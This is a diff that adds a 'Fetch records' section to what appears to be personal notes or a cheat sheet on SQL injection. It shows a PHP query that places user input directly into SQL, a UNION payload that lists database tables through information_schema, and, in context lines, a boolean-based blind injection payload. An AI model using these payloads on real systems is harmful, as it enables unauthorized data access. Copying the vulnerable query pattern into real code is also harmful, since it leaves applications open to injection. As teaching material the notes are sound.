@@ -63,4 +63,23 @@ Some boolean-based SQL injections:
 * **For any text**: `' AND (ascii(substr((select database()),1,1))) = 115 --`: return true if the first character of the name of the database is "s" (ascii('s') is 115).
 </details>
 
+<details class="details-e">
+<summary>Fetch records</summary>
+
+If you have a SQL injection possible in a page displaying every username given a country, with by the following SQL query
+
+```php
+$sql = "SELECT username FROM users WHERE country='$country'";
+```
+
+Then, using UNION, you could add another request which will append the results of the second request in the view of the first request <small>(**note**: UNION requires the same number of columns in every SELECT)</small>
+
+```sql
+-- inject $country with "' UNION SELECT TABLE_NAME FROM information_schema.TABLES"
+SELECT username FROM users WHERE country=''
+UNION
+SELECT TABLE_NAME FROM information_schema.TABLES
+```
+</details>
+
 </details>
